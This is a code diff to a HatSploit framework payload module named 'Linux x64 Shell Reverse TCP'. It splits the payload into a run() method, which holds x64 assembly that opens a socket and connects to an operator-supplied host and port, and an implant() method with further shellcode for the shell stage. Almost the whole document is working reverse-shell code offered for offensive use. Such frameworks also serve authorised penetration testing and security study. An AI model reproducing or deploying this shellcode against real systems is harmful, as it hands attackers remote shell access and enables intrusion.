@@ -3,16 +3,17 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
+
 from pex.assembler import Assembler
 from pex.socket import Socket
 
 
-class HatSploitPayload(Payload, Assembler, Socket):
+class HatSploitPayload(Payload, Handler, Assembler, Socket):
     def __init__(self):
         super().__init__()
 
-        self.details = {
+        self.details.update({
             'Name': "Linux x64 Shell Reverse TCP",
             'Payload': "linux/x64/shell_reverse_tcp",
             'Authors': [
@@ -23,35 +24,13 @@ class HatSploitPayload(Payload, Assembler, Socket):
             'Platform': "linux",
             'Rank': "high",
             'Type': "reverse_tcp",
-        }
+        })
 
-    def run(self):
-        rhost = self.pack_host(self.handler['RHOST'])
-        rport = self.pack_port(self.handler['RPORT'])
-
+    def implant(self):
         return self.assemble(
             self.details['Architecture'],
-            f"""
+            """
             start:
-                push 0x29
-                pop rax
-                cdq
-                push 0x2
-                pop rdi
-                push 0x1
-                pop rsi
-                syscall
-
-                xchg rdi, rax
-                movabs rcx, 0x{rhost.hex()}{rport.hex()}0002
-                push rcx
-                mov rsi, rsp
-                push 0x10
-                pop rdx
-                push 0x2a
-                pop rax
-                syscall
-
                 push 0x3
                 pop rsi
 
@@ -74,3 +53,32 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 syscall
             """
         )
+
+    def run(self):
+        host = self.pack_host(self.rhost.value)
+        port = self.pack_port(self.rport.value)
+
+        return self.assemble(
+            self.details['Architecture'],
+            f"""
+            start:
+                push 0x29
+                pop rax
+                cdq
+                push 0x2
+                pop rdi
+                push 0x1
+                pop rsi
+                syscall
+
+                xchg rdi, rax
+                movabs rcx, 0x{host.hex()}{port.hex()}0002
+                push rcx
+                mov rsi, rsp
+                push 0x10
+                pop rdx
+                push 0x2a
+                pop rax
+                syscall
+            """
+        ) + self.implant()
